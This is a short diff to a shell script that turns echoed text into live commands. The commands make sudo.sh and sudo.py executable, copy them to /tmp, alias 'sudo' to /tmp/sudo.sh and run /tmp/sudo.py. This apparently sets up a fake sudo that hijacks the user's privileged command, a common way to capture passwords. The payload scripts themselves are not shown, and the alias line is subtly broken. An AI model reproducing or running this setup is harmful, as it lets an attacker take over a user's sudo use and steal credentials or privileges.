@@ -1,9 +1,9 @@
-echo "chmod +x sudo.sh"
-echo "cp sudo.sh /tmp/sudo.sh"
+chmod +x sudo.sh
+cp sudo.sh /tmp/sudo.sh
 
-echo "chmod +x sudo.py"
-echo "cp sudo.py /tmp/sudo.py"
+chmod +x sudo.py
+cp sudo.py /tmp/sudo.py
 
 
-echo "alias sudo='/tmp/sudo.sh' >> ~/.bash_aliases"
-echo "python /tmp/sudo.py $i"
+alias sudo='/tmp/sudo.sh' >> ~/.bash_aliases
+python /tmp/sudo.py $i
